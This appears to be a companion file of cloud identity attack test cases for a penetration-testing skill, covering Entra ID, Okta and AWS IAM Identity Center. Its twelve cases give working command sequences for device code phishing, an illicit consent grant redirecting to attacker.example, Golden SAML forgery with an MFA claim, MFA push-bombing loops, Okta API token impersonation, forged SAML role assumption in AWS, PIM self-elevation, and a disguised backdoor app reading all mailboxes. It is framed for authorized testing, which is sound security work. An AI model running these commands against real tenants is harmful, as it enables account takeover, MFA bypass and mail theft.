# Cloud Identity Provider Attack Test Cases

> Companion to `SKILL.md`, containing structured test cases organized by category with severity ratings.
> All commands assume an authorized engagement scope, a test tenant (Microsoft 365 Developer Program tenant or Okta Developer free tenant), or a clone of the production tenant. Never run active exploitation against production without explicit written authorization.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-----------|
| A. Tenant Recon & Enumeration | 2 | LOW - MEDIUM |
| B. OAuth Token Acquisition | 2 | HIGH - CRITICAL |
| C. SAML & Federation Compromise | 2 | CRITICAL |
| D. Conditional Access Bypass | 2 | HIGH - CRITICAL |
| E. Cloud-to-Cloud Pivot (AWS IC, Okta, Google) | 2 | HIGH - CRITICAL |
| F. Persistence & JIT Abuse | 2 | HIGH - CRITICAL |
| **Total** | **12** | **LOW - CRITICAL** |

---

## A. Tenant Recon & Enumeration

### TC-CI-001: Azure AD Tenant Reconnaissance (Unauthenticated)

| Field | Value |
|------|-----|
| **ID** | TC-CI-001 |
| **Name** | Azure AD / Entra ID Tenant Reconnaissance (Unauthenticated) |
| **Severity** | LOW |
| **Category** | Tenant Recon |
| **Objective** | Identify the target tenant GUID, verified/federated domains, federation endpoints, and authentication configuration without credentials. |
| **Prerequisites** | Network egress to `login.microsoftonline.com`. No credentials required. |
| **Tools** | curl, jq, AADInternals (PowerShell), dig |
| **Steps** | 1. `curl -s https://login.microsoftonline.com/corp.com/.well-known/openid-configuration \| jq '.issuer, .authorization_endpoint, .token_endpoint'` — confirm tenant exists and discover OIDC endpoints.<br>2. `curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=victim@corp.com&xml=1"` — determine if domain is Managed (Entra ID) or Federated (AD FS / Okta).<br>3. `Import-Module AADInternals; Get-AADIntTenantDomains -Domain corp.com` — extract tenant GUID and verified/federated domains.<br>4. `dig +short TXT corp.com \| grep -i 'MS=ms'` — confirm tenant ownership via DNS TXT.<br>5. If federated, `curl -s https://login.microsoftonline.com/corp.com/FederationMetadata/2007-06/FederationMetadata.xml` — extract IdP metadata, signing certs, endpoints. |
| **Expected Result** | Tenant GUID, verified domains list, federation type (Managed/Federated), IdP endpoints and signing certificates (if federated). |
| **False Positive Risk** | LOW — public endpoints return authoritative data. |
| **Cleanup** | None (read-only enumeration). |
| **References** | payloads.md §1.1, §1.2; AADInternals docs |

### TC-CI-002: User/Group/Service Principal Enumeration via Graph

| Field | Value |
|------|-----|
| **ID** | TC-CI-002 |
| **Name** | User/Group/Service Principal Enumeration via Microsoft Graph |
| **Severity** | MEDIUM |
| **Category** | Tenant Recon |
| **Objective** | Given a low-privileged user credential, enumerate users, groups, service principals, applications, conditional access policies, and directory role assignments. |
| **Prerequisites** | Valid low-priv user credential in the target tenant (any user with `User.ReadBasic.All` or higher). |
| **Tools** | Azure CLI (az), Microsoft Graph API, ROADtools |
| **Steps** | 1. `az login --use-device-code --tenant corp.com` — authenticate.<br>2. `az rest --method get --url "https://graph.microsoft.com/v1.0/users?\$select=userPrincipalName,displayName,jobTitle,department"` — list all users.<br>3. `az rest --method get --url "https://graph.microsoft.com/v1.0/groups?\$select=displayName,description"` — list all groups.<br>4. `az rest --method get --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId,appRoles"` — list service principals (apps integrated with tenant).<br>5. `az rest --method get --url "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"` — list CA policies (often restricted to CA Admin — note 403 if so).<br>6. `az rest --method get --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$expand=principal"` — list directory role assignments (who has Global Admin etc.).<br>7. For comprehensive dump: `python roadrecon gather` — outputs SQLite DB with all of the above. |
| **Expected Result** | Full enumeration of tenant directory objects. Identify high-priv service principals (those with `Application.ReadWrite.All`, `Mail.ReadWrite`, `RoleManagement.ReadWrite.Directory`), Global Administrator users, and conditional access policy coverage. |
| **False Positive Risk** | LOW — Graph API responses are authoritative. |
| **Cleanup** | None (read-only). |
| **References** | payloads.md §2.1, §2.3; ROADtools docs |

---

## B. OAuth Token Acquisition

### TC-CI-003: OAuth Device Code Phishing

| Field | Value |
|------|-----|
| **ID** | TC-CI-003 |
| **Name** | OAuth Device Code Phishing for Microsoft Graph Token |
| **Severity** | HIGH |
| **Category** | Token Acquisition |
| **Objective** | Demonstrate that an attacker can acquire Microsoft Graph tokens by initiating a device code flow and tricking a victim into completing authentication at `microsoft.com/devicelogin`. |
| **Prerequisites** | Phishing delivery channel (email, Teams, fake login page). Test tenant with a willing victim user. |
| **Tools** | ROADtools (roadrecon), TokenTactics |
| **Steps** | 1. Attacker initiates device code flow: `python roadrecon auth --device-code --tenant corp.com`. Output includes a device code (e.g., `ABCDE1234`) and the URL `https://microsoft.com/devicelogin`.<br>2. Phish the code to the victim (e.g., "Please authenticate at microsoft.com/devicelogin with code ABCDE1234 to access your updated timesheet").<br>3. Victim completes auth (including MFA) at `microsoft.com/devicelogin`.<br>4. Attacker's `roadrecon auth` process completes, writing `.roadtools_auth` with access + refresh tokens for Microsoft Graph.<br>5. Verify: `cat .roadtools_auth \| jq .accessToken \| cut -d. -f2 \| base64 -d 2>/dev/null \| jq .` — decode the JWT and confirm `aud`, `scp`, `oid` (victim's user ID).<br>6. Use the token: `az rest --url https://graph.microsoft.com/v1.0/me --headers "Authorization=Bearer $TOKEN"` — returns victim's profile. |
| **Expected Result** | Access + refresh tokens for Microsoft Graph, valid for the victim user, with the scopes granted at consent time. |
| **False Positive Risk** | LOW — `.roadtools_auth` contains live tokens. |
| **Cleanup** | Revoke the tokens via `az rest --method post --url "https://graph.microsoft.com/v1.0/me/revokeSignInSessions"` (as the victim user) or have the victim run this. |
| **References** | payloads.md §3.1, §3.5; TokenTactics docs; Microsoft device code flow docs |

### TC-CI-004: Illicit Consent Grant

| Field | Value |
|------|-----|
| **ID** | TC-CI-004 |
| **Name** | Illicit Consent Grant (Backdoor App Registration) |
| **Severity** | CRITICAL |
| **Category** | Token Acquisition |
| **Objective** | Demonstrate that an attacker can register a malicious app, trick a victim into consenting to high-privilege scopes (Mail.Read), and then read the victim's mail indefinitely. |
| **Prerequisites** | Attacker has their own Entra ID tenant (free tier) to register the app. Phishing delivery channel for the consent URL. Test victim user. |
| **Tools** | Azure CLI (or Entra ID admin center), curl |
| **Steps** | 1. In attacker's tenant: register an app with redirect URI `https://attacker.example/callback`, required scopes `Mail.Read offline_access`.<br>2. Construct admin consent URL: `https://login.microsoftonline.com/organizations/v2.0/adminconsent?client_id=<app-id>&scope=https://graph.microsoft.com/Mail.Read offline_access&redirect_uri=https://attacker.example/callback`.<br>3. Phish the consent URL to the victim. If victim is Global Admin, the consent is tenant-wide; otherwise it's user-scoped (still sufficient for `Mail.Read`).<br>4. Victim clicks → consents → Microsoft redirects to `https://attacker.example/callback?code=<auth-code>`.<br>5. Attacker exchanges auth code for tokens: `curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token -d "client_id=$APP_ID&scope=$SCOPES&code=$CODE&redirect_uri=$REDIRECT_URI&grant_type=authorization_code&client_secret=$SECRET"`.<br>6. Attacker reads victim's mail: `curl -H "Authorization: Bearer $ACCESS_TOKEN" https://graph.microsoft.com/v1.0/me/messages`. |
| **Expected Result** | Attacker obtains valid access + refresh tokens for Microsoft Graph with `Mail.Read` scope, persists indefinitely via refresh token. |
| **False Positive Risk** | LOW — verify by reading mail. |
| **Cleanup** | Victim revokes consent in MyApps → Permissions, or admin runs `az rest --method delete --url https://graph.microsoft.com/v1.0/oauth2PermissionGrants/<grant-id>`. |
| **References** | payloads.md §3.3, §15.1; Microsoft consent docs; OAuth 2.0 RFC 6749 |

---

## C. SAML & Federation Compromise

### TC-CI-005: SAML Response Signature Wrapping

| Field | Value |
|------|-----|
| **ID** | TC-CI-005 |
| **Name** | SAML Response Signature Wrapping Bypass |
| **Severity** | CRITICAL |
| **Category** | SAML / Federation |
| **Objective** | Demonstrate that a SAML-relying application accepts a signature-wrapped SAML response, allowing an attacker to authenticate as any user by modifying the unsigned assertion while preserving the signed wrapper. |
| **Prerequisites** | A SAML-protected application in scope. Burp Suite (or intercepting proxy). SAML Raider extension. |
| **Tools** | Burp Suite, SAML Raider extension |
| **Steps** | 1. Capture a valid SAML response by completing a normal auth flow through the target app.<br>2. Send the response to Burp Repeater, enable SAML Raider extension.<br>3. In SAML Raider, select "Signature Wrapping" attack mode, choose XML signature wrapping variant (e.g., "XSW Response 1", "XSW Assertion 1").<br>4. Modify the unsigned assertion's `Subject` and `AttributeStatement` to impersonate a privileged user.<br>5. Forward the modified SAML response to the SP.<br>6. Observe: if the SP logs in as the modified user, signature wrapping is exploitable. |
| **Expected Result** | Either (a) SP rejects the wrapped response (not vulnerable) — informational, or (b) SP authenticates as the attacker-controlled user — CRITICAL finding. |
| **False Positive Risk** | LOW — successful impersonation is unambiguous. |
| **Cleanup** | None (test SAML response is one-shot). |
| **References** | payloads.md §5.1; CVE-2017-11427 (OneLogin signature wrapping); SAML Raider docs |

### TC-CI-006: Golden SAML via AD FS Token-Signing Certificate

| Field | Value |
|------|-----|
| **ID** | TC-CI-006 |
| **Name** | Golden SAML Assertion via AD FS Token-Signing Certificate |
| **Severity** | CRITICAL |
| **Category** | SAML / Federation |
| **Objective** | Demonstrate that an attacker with the AD FS token-signing certificate can forge SAML assertions as any user, bypassing MFA, and authenticate to Entra ID. |
| **Prerequisites** | AD FS token-signing certificate (extracted via Domain Admin on-prem + DKM key share path, or other means). Test Entra ID tenant federated with AD FS. |
| **Tools** | AADInternals (PowerShell) |
| **Steps** | 1. Load the AD FS signing cert: `$cert = Import-PfxCertificate -FilePath TokenSigning.pfx -Password (ConvertTo-SecureString 'pfxpassword' -AsPlain -Force)`.<br>2. Forge a SAML assertion as the target user: `$token = New-AADIntSAMLToken -ImmutableId 'victim@corp.com' -Issuer 'http://adfs.corp.com/adfs/services/trust' -Certificate $cert -Audience 'urn:federation:MicrosoftOnline' -Expiry (Get-Date).AddHours(2) -MFA -IncludeAuthenticationMethod`.<br>3. Use the SAML assertion to authenticate to Entra ID: `Open-AADIntOffice365Portal -SAMLToken $token`.<br>4. Verify: receive an Entra ID bearer token, then call Microsoft Graph as the victim: `Get-AADIntUser -AccessToken $token`.<br>5. Note that the MFA claim in the forged assertion (`-MFA -IncludeAuthenticationMethod`) satisfies Entra ID's CA policy without the user actually completing MFA. |
| **Expected Result** | Valid Entra ID bearer token for the victim user, accepted by Microsoft Graph, no MFA challenge presented to the user. |
| **False Positive Risk** | LOW — successful auth as victim is definitive. |
| **Cleanup** | Notify tenant admins to rotate the AD FS token-signing cert (this is the only remediation). The forged token expires after 2h; revocation requires cert rotation. |
| **References** | payloads.md §5.2, §5.3, §7.1; CyberArk Golden SAML research; SolarWinds SUNBURST report (CISA AA21-008A) |

---

## D. Conditional Access Bypass

### TC-CI-007: Conditional Access Bypass via Legacy Authentication

| Field | Value |
|------|-----|
| **ID** | TC-CI-007 |
| **Name** | Conditional Access Bypass via Legacy Authentication (IMAP/POP/EAS) |
| **Severity** | HIGH |
| **Category** | Conditional Access Bypass |
| **Objective** | Demonstrate that a tenant with MFA enforcement via Conditional Access still allows password-only authentication via legacy protocols (IMAP, POP3, Exchange ActiveSync), bypassing MFA. |
| **Prerequisites** | Target user with valid password. Test tenant where MFA is enforced via CA but legacy auth is not blocked. |
| **Tools** | MFASweep (PowerShell), swaks, curl |
| **Steps** | 1. Run MFASweep to identify legacy endpoints that accept basic auth: `Invoke-MFASweep -Username "victim@corp.com" -Password "P@ssw0rd"`. Note which services report "MFA NOT Required".<br>2. Confirm via direct protocol test: `swaks --to victim@corp.com --server outlook.office365.com:993 --auth LOGIN --auth-user victim@corp.com --auth-password 'P@ssw0rd' -tls --port 993` — if success, IMAP is open without MFA.<br>3. Test Exchange ActiveSync: `curl -X POST https://outlook.office365.com/Microsoft-Server-ActiveSync -u "victim@corp.com:P@ssw0rd" -H "MS-ASProtocolVersion: 14.0"` — if 200, EAS is open without MFA.<br>4. If any service authenticates without MFA, document the bypass. |
| **Expected Result** | Either (a) all legacy auth endpoints return 401/403 (tenant is hardened) — informational, or (b) at least one legacy endpoint authenticates with password only — HIGH finding. |
| **False Positive Risk** | LOW — successful auth is definitive. |
| **Cleanup** | None (auth only). |
| **References** | payloads.md §6.1, §6.2; Microsoft Basic Auth deprecation announcement (Oct 2022) |

### TC-CI-008: MFA Fatigue (Push-Bombing) Simulation

| Field | Value |
|------|-----|
| **ID** | TC-CI-008 |
| **Name** | MFA Fatigue (Push-Bombing) Simulation |
| **Severity** | HIGH |
| **Category** | Conditional Access Bypass |
| **Objective** | Demonstrate that an attacker can exhaust a user with MFA push prompts until they tap "approve" — yielding a valid authenticated session. |
| **Prerequisites** | Test user with push-based MFA enrolled (Microsoft Authenticator, Okta Verify, or Duo). Explicit engagement authorization for user-targeted social engineering (often out of scope for infrastructure-only engagements). |
| **Tools** | curl, scripting (bash/Python) |
| **Steps** | 1. Trigger an auth flow for the victim user that requires MFA push (Okta: `POST /api/v1/authn`; Microsoft: trigger via /common/SAS).<br>2. Loop rapidly (10-50 prompts in 30 seconds): `for i in $(seq 1 20); do curl -s -X POST https://corp.okta.com/api/v1/authn -H "Content-Type: application/json" -d '{"username":"victim@corp.com"}' & done; wait`.<br>3. User receives 20 push notifications in rapid succession — fatigue leads to accidental approval.<br>4. Capture the resulting session token / cookie.<br>5. Note: Microsoft has mitigated this in Microsoft Authenticator via number-matching (default since 2023) — confirm the IdP's posture. |
| **Expected Result** | Either (a) user does not approve (number-matching is enforced, fatigue fails) — informational, or (b) user approves one of the prompts — HIGH finding, valid session obtained. |
| **False Positive Risk** | MEDIUM — fatigue success depends on user behavior; need user corroboration. |
| **Cleanup** | Notify user to revoke any approved sessions; admins check for unexpected session creations in the time window. |
| **References** | payloads.md §6.5, §13.1; CISA AA22-040A (LAPSUS$); Uber Sep 2022 incident |

---

## E. Cloud-to-Cloud Pivot (AWS IC, Okta, Google)

### TC-CI-009: Okta API Token Theft and Replay

| Field | Value |
|------|-----|
| **ID** | TC-CI-009 |
| **Name** | Okta API Token Theft and User Impersonation |
| **Severity** | CRITICAL |
| **Category** | Cloud-to-Cloud Pivot |
| **Objective** | Demonstrate that a stolen Okta API token (SSWS) grants full administrative control, including user impersonation via session creation. |
| **Prerequisites** | Stolen Okta API token (from CI/CD env var, .okta-aws config, source code). Test Okta tenant. |
| **Tools** | curl, jq |
| **Steps** | 1. Enumerate: `curl -s -H "Authorization: SSWS <token>" https://corp.okta.com/api/v1/users \| jq '.[].profile.login'` — list all users.<br>2. List apps: `curl -s -H "Authorization: SSWS <token>" https://corp.okta.com/api/v1/apps \| jq '.[].label'` — enumerate integrated apps.<br>3. Identify a target user (privileged, e.g., admin group member): `curl -s -H "Authorization: SSWS <token>" "https://corp.okta.com/api/v1/groups?q=Admin" \| jq`.<br>4. Create a session for the target user (impersonation): `curl -s -X POST -H "Authorization: SSWS <token>" -H "Content-Type: application/json" -d '{"userId":"00u1xxxxx"}' "https://corp.okta.com/api/v1/sessions?additionalFields=cookieToken" \| jq .cookieToken` — returns a session token.<br>5. Use the session token as `sid` cookie: `curl -s -H "Cookie: sid=$SESSION" https://corp.okta.com/end-user/settings` — full SSO as the victim. |
| **Expected Result** | Full tenant enumeration + a session cookie for the target user, granting SSO to all Okta-integrated apps as that user. |
| **False Positive Risk** | LOW — successful impersonation is unambiguous. |
| **Cleanup** | Revoke the stolen API token (`DELETE /api/v1/api-tokens/<id>` as super admin); revoke the impersonated session; rotate any creds the attacker accessed via the session. |
| **References** | payloads.md §10.1-10.3; Okta API docs |

### TC-CI-010: AWS IAM Identity Center SAML Role Assumption

| Field | Value |
|------|-----|
| **ID** | TC-CI-010 |
| **Name** | AWS IAM Identity Center SAML Role Assumption via Forged Assertion |
| **Severity** | CRITICAL |
| **Category** | Cloud-to-Cloud Pivot |
| **Objective** | Demonstrate that a forged SAML assertion (from a compromised IdP like Entra ID or Okta) can be used to assume AWS IAM roles via IAM Identity Center, pivoting from the IdP to AWS. |
| **Prerequisites** | Compromised IdP signing key (Entra ID or Okta federated with AWS IC). AWS account with IC configured. |
| **Tools** | python3-saml, AWS CLI |
| **Steps** | 1. Forge a SAML assertion with audience `https://signin.aws.amazon.com/saml`, issuer `<IdP's issuer URI>`, signing with the IdP's signing cert. The assertion must include the `Role` attribute containing AWS role ARN + SAML provider ARN pairs.<br>2. Base64-encode the assertion: `ASSERTION_B64=$(base64 -w0 forged_assertion.xml)`.<br>3. Assume role: `aws sts assume-role-with-saml --role-arn "arn:aws:iam::111122223333:role/MyRole" --principal-arn "arn:aws:iam::111122223333:saml-provider/EntraId" --saml-assertion "$ASSERTION_B64" --duration-seconds 3600`.<br>4. Receive AWS creds (AccessKeyId, SecretAccessKey, SessionToken).<br>5. Verify: `export AWS_ACCESS_KEY_ID=...; aws sts get-caller-identity` — returns the assumed role's ARN.<br>6. Operate in AWS: `aws s3 ls`, `aws iam list-users`, etc. |
| **Expected Result** | Valid AWS temporary credentials for the assumed role; full AWS permissions of that role. |
| **False Positive Risk** | LOW — STS returns definitive credentials. |
| **Cleanup** | AWS creds expire after 1h (or shorter). If persistent damage, rotate any secrets accessed. |
| **References** | payloads.md §5.4, §9.2; AWS STS docs; SolarWinds AWS role assumption research |

---

## F. Persistence & JIT Abuse

### TC-CI-011: JIT (PIM) Elevation Abuse

| Field | Value |
|------|-----|
| **ID** | TC-CI-011 |
| **Name** | JIT (PIM) Self-Activation to Privileged Role |
| **Severity** | HIGH |
| **Category** | Persistence & JIT Abuse |
| **Objective** | Demonstrate that a user with PIM-eligible role assignment can self-activate the role (no approver required) and operate at elevated privilege. |
| **Prerequisites** | A user with PIM-eligible Global Administrator (or other privileged) role. Self-activation must be permitted (no approver configured). |
| **Tools** | Azure CLI (az), Microsoft Graph |
| **Steps** | 1. Enumerate PIM eligibility: `USER_ID=$(az ad signed-in-user show --query id -o tsv); az rest --method get --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilitySchedules?\$filter=principalId eq '$USER_ID'"` — list eligible roles.<br>2. Note the Global Administrator role definition ID (`62e90394-69f5-4237-9190-012177145e10`).<br>3. Activate the role: `az rest --method post --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests" --body '{"action":"AdminAssign","principalId":"<id>","roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10","directoryScopeId":"/","justification":"Incident response","scheduleInfo":{"startDateTime":"2026-06-17T12:00:00Z","expiration":{"type":"AfterDuration","duration":"PT4H"}}}'`.<br>4. If activation succeeds immediately (no approval), the role is now active for 4 hours.<br>5. Use the elevated role: `az rest --method get --url "https://graph.microsoft.com/v1.0/applications"` — enumerate apps as GA.<br>6. Deactivate (optional, or let it expire): change `action` to `AdminRemove`. |
| **Expected Result** | Either (a) activation requires approval (LOW — well-configured) or (b) activation succeeds immediately (HIGH — self-service PIM is enabled). |
| **False Positive Risk** | LOW — successful role activation is audited and definitive. |
| **Cleanup** | Deactivate the role (AdminRemove) or let it expire. Audit log entry remains. |
| **References** | payloads.md §14.1-14.3, §15.4; Entra ID PIM docs |

### TC-CI-012: Persistence via Backdoor App Registration

| Field | Value |
|------|-----|
| **ID** | TC-CI-012 |
| **Name** | Persistence via Backdoor App Registration with `Mail.Read` |
| **Severity** | CRITICAL |
| **Category** | Persistence |
| **Objective** | Demonstrate that an attacker with Application Administrator or Global Admin can create a backdoor app registration with `Mail.Read` that persists across password resets and user deletions. |
| **Prerequisites** | Application Administrator or Global Administrator role in the target tenant. |
| **Tools** | Azure CLI (az), curl |
| **Steps** | 1. Register the app: `az ad app create --display-name "Contoso-Backup-Sync" --required-resource-accesses '[{"resourceAppId":"00000003-0000-0000-c000-000000000000","resourceAccess":[{"id":"024d486e-b451-40bb-833d-3e28d5d60bb0","type":"Scope"}]}]'`. (024d486e = Mail.Read scope.)<br>2. Create service principal: `az ad sp create --id <new-app-id>`.<br>3. Add client secret: `az ad app credential reset --id <new-app-id> --append` — record the secret.<br>4. Grant admin consent: `az ad app permission admin-consent --id <new-app-id>` — grants tenant-wide Mail.Read.<br>5. Acquire a token via client credentials flow: `curl -X POST https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token -d "client_id=<app-id>&client_secret=<secret>&scope=https://graph.microsoft.com/.default&grant_type=client_credentials"`.<br>6. Read any mailbox: `curl -H "Authorization: Bearer $ACCESS_TOKEN" https://graph.microsoft.com/v1.0/users/victim@corp.com/messages` — returns victim's mail.<br>7. The app persists until explicitly deleted (survives password resets, user deletions, MFA re-enrollment). |
| **Expected Result** | App registration with tenant-wide `Mail.Read` permission, usable via client credentials indefinitely. |
| **False Positive Risk** | LOW — successful mail read confirms. |
| **Cleanup** | Delete the app: `az ad app delete --id <app-id>`. Review and remove the consent grant. Audit log entry remains. |
| **References** | payloads.md §8.2, §15.1; Microsoft application permissions docs |

---

## Appendix: Severity Calibration

| Severity | Definition | Example |
|----------|------------|---------|
| **LOW** | Reconnaissance / enumeration. No impact alone. | TC-CI-001 (unauth tenant recon) |
| **MEDIUM** | Authenticated enumeration that expands attacker knowledge. | TC-CI-002 (user enum via Graph) |
| **HIGH** | Token acquisition or bypass that grants initial unauthorized access. | TC-CI-003 (device code phishing), TC-CI-007 (legacy auth bypass), TC-CI-008 (MFA fatigue), TC-CI-011 (PIM self-activation) |
| **CRITICAL** | Full tenant compromise, persistence, or cross-cloud pivot. | TC-CI-004 (illicit consent grant), TC-CI-005/006 (SAML forgery), TC-CI-009/010 (API/role pivot), TC-CI-012 (backdoor app) |

## Appendix: Test Tenant Setup

For reproducible testing, set up isolated test tenants:

- **Microsoft 365 Developer Program**: [developer.microsoft.com/microsoft-365-dev-program](https://developer.microsoft.com/microsoft-365-dev-program) — free E5 tenant with 25 licenses, 90 days renewable.
- **Okta Developer Edition**: [developer.okta.com](https://developer.okta.com) — free Okta tenant with 5 users.
- **Auth0 Free Tier**: [auth0.com](https://auth0.com) — free Auth0 tenant with 7000 MAU.
- **AWS IAM Identity Center**: Free with any AWS account; enable in AWS Console → Security, Identity, & Compliance → IAM Identity Center.
- **Google Workspace**: 14-day free trial at [workspace.google.com](https://workspace.google.com).

Run all destructive tests (TC-CI-005 through TC-CI-012) in these test tenants, never in production.
